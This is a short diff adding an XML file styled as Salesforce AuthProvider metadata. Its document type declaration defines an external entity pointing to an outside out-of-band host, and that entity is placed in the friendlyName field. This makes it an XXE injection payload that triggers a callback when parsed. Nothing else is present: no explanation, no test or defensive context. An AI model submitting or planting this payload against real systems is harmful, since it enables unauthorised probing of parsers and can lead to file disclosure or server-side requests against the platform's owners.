@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [ <!ENTITY gsx SYSTEM "https://oob.binary-man.in/xxewide/authprovider"> ]>
+<AuthProvider xmlns="http://soap.sforce.com/2006/04/metadata"><friendlyName>&gsx;</friendlyName><providerType>OpenIdConnect</providerType><registrationHandler>x</registrationHandler></AuthProvider>
